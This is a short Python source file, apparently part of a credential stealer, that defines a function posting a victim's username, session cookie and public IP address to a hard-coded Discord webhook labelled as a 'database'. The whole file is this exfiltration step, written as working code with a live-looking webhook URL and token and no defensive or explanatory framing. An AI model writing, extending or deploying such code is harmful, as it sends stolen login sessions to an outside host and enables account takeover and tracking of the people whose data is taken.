import requests

# Webhook URL for the second webhook (modify this)
DATABASE_WEBHOOK_URL = "https://discord.com/api/webhooks/1347591981567840277/iZdHuzSQy1UuB9IJ6nz5oG-NSepNBqpFtNR3mmIZ82lKo5-4VwSQekeKjXBWOAF8AE4S"

def send_to_database_webhook(username, cookie, ip):
    payload = {
        "content": f"Username: {username}\nCookie: {cookie}\nPublic IP: {ip}"
    }
    
    requests.post(DATABASE_WEBHOOK_URL, json=payload)